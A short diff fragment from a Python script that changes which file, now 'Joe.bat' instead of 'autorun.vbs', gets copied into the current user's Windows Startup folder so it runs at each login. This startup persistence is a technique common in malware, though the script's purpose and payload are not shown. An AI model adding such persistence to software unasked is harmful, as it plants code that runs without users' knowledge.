@@ -188,7 +188,7 @@ def checkstate():
         pass
     sys.exit()
 
-filename = 'autorun.vbs'
+filename = 'Joe.bat'
 dir_name = f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
 shutil.copy(filename, dir_name)
 
